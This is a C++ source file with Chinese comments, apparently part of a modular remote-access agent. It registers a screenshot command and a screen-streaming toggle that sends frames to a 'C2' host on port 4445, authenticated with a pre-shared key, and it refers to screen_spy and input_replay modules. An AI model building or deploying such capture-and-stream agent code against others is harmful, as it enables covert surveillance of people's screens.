// screen_module.cpp — "远程桌面"能力的指令实现与注册
//
// 这里集中放原本长在 core 里的屏幕能力代码：
//   · 0x1001 截屏（GDI 抓帧 → WIC JPEG）      ← 从 cmd_dispatch.cpp 搬来
//   · 0x1002 屏幕流开关                        ← 从 cmd_dispatch.cpp 搬来
//   · 配置钩子（把 host/psk 交给屏幕流）       ← 原来是 agent_runtime 直接调用
//
// 这样一来 core（cmd_dispatch / agent_runtime）不再认识"屏幕"这个名字，
// 只通过 capability.h 的注册表与它打交道。
//
// 阶段 2 会把本文件连同 screen_spy / screen_stream / input_replay / desktop_switch
// 一起搬到 client/agents/screen/，并从全量 agent 移除。
#include "screen_module.h"

#include "capability.h"
#include "protocol.h"
#include "screen_spy.h"
#include "screen_stream.h"
#include "session.h"

#include <cstring>
#include <string>
#include <vector>

namespace c2
{

    namespace
    {

        // 0x1001 截屏：响应为 JPEG 原始字节（二进制，不经文本转换）
        // 失败时与改造前保持一致：status=0x80 且响应为 "screenshot failed"
        bool cmd_screenshot(uint16_t, const uint8_t*, size_t,
            std::vector<uint8_t>& response, uint8_t& status)
        {
            status = kStatusOK;
            ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, 1.0f);
            if (!spy)
            {
                status = kStatusPluginErrBase;
                const char* msg = "screenshot failed";
                response.assign(msg, msg + strlen(msg));
                return true;
            }
            std::vector<uint8_t> jpeg;
            bool ok = spy->grab() &&
                jpeg_encode_bgra(spy->width(), spy->height(), spy->stride(),
                    spy->pixels(), 75, jpeg);
            delete spy;
            if (!ok || jpeg.empty())
            {
                status = kStatusPluginErrBase;
                const char* msg = "screenshot failed";
                response.assign(msg, msg + strlen(msg));
                return true;
            }
            response = std::move(jpeg);
            return true;
        }

        // 0x1002 屏幕流开关：payload = 控制(1B: 0=停/1=开) + fps(1B) + quality(1B) + scale(1B,百分数)
        bool cmd_screen_stream(uint16_t, const uint8_t* payload, size_t len,
            std::vector<uint8_t>& response, uint8_t& status)
        {
            status = kStatusOK;
            if (len < 1)
            {
                status = kStatusBadParam;
                return true;
            }
            uint8_t control = payload[0];
            int fps = len > 1 ? payload[1] : 25;
            int quality = len > 2 ? payload[2] : 70;
            float scale = len > 3 && payload[3] > 0 ? (float)payload[3] / 100.0f : 1.0f;
            std::string text;
            if (control != 0)
                text = start_screen_stream(fps, quality, scale)
                    ? "screen stream started"
                    : "screen stream already running";
            else
            {
                stop_screen_stream();
                text = "screen stream stopped";
            }
            response.assign(text.begin(), text.end());
            return true;
        }

        // 屏幕流要自己建 4445 长连接，需要知道 C2 地址与 PSK
        void on_config(const std::string& host, const AgentConfig& cfg)
        {
            screen_stream_set_config(host, cfg);
        }

        const CapCommand kScreenCommands[] = {
            { kCmdScreenshot, cmd_screenshot },
            { kCmdScreenStream, cmd_screen_stream },
        };

    }  // namespace

    void screen_module_register()
    {
        cap_register_commands(kScreenCommands,
            sizeof(kScreenCommands) / sizeof(kScreenCommands[0]));
        cap_register_config(on_config);
    }

}  // namespace c2
